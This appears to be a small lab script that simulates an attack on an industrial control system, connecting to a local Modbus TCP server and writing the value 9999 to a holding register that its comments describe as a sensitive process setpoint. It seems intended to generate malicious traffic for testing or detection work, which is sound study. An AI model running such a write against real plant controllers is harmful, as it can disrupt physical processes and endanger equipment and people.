import time
from pymodbus.client import ModbusTcpClient

# normal traffic only reads. here the attacker WRITES to box 100
# which we reserved as a setpoint becuase boxes 100-120 are sensitive
# in a real plant this changes a crucial process
HOST = "127.0.0.1"
PORT = 5020

def main():
    client = ModbusTcpClient(HOST, port=PORT)
    client.connect()
    print("attacker connected. writing to sensitive setpoint register 100...")
    client.write_register(address=100, value=9999)   # fc 6, changes a setpoint that should never change
    print("done. wrote value 9999 to register 100.")
    client.close()

if __name__ == "__main__":
    main()